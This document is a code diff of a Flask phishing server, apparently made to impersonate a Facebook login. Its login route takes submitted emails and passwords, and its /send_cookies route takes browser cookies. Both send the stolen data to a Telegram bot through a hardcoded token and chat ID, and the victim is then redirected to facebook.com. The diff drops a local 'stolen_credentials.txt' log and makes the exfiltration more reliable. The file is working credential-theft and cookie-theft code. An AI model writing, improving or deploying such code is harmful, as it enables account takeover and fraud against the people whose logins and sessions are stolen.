@@ -1,27 +1,25 @@
-from flask import Flask, render_template, request, redirect, make_response
+from flask import Flask, render_template, request, redirect
 import os
 import requests
 from datetime import datetime
 
 app = Flask(__name__)
 
-# ================== TELEGRAM CONFIG ==================
 TELEGRAM_TOKEN = "8600949928:AAERwWL0-6sODzfixw--L5rNHW4hRW56HnY"
 TELEGRAM_CHAT_ID = "6126534090"
 
 def send_to_telegram(title, content):
-    message = f"""
-🔴 **{title}**
-
-{content}
-⏰ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-    """
+    message = f"🔴 {title}\n\n{content}\n⏰ {datetime.now()}"
+    print(f"🔄 Đang gửi Telegram: {title}")   # Debug
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
-        print(f"✅ Gửi Telegram: {title}")
+        r = requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+            data={"chat_id": TELEGRAM_CHAT_ID, "text": message},
+            timeout=10
+        )
+        print(f"✅ Telegram Response: {r.status_code} - {r.text[:100]}")
     except Exception as e:
-        print(f"❌ Lỗi Telegram: {e}")
+        print(f"❌ LỖI GỬI TELEGRAM: {e}")
 
 @app.route('/')
 def home():
@@ -31,18 +29,14 @@ def home():
 def login():
     email = request.form.get('email')
     password = request.form.get('pass')
-    
-    with open('stolen_credentials.txt', 'a', encoding='utf-8') as f:
-        f.write(f"[{datetime.now()}] Email: {email} | Password: {password}\n")
-    
     send_to_telegram("CREDENTIALS", f"📧 Email: {email}\n🔑 Password: {password}")
     return redirect('https://www.facebook.com')
 
 @app.route('/send_cookies', methods=['POST'])
 def send_cookies():
-    data = request.json
-    cookies = data.get('cookies', 'No cookies')
-    send_to_telegram("COOKIE THU THẬP", f"🍪 Cookies:\n{cookies}")
+    data = request.get_json()
+    cookies = data.get('cookies', 'No cookies') if data else 'No data'
+    send_to_telegram("COOKIE", f"Cookies: {cookies[:500]}...")
     return "OK", 200
 
 if __name__ == '__main__':
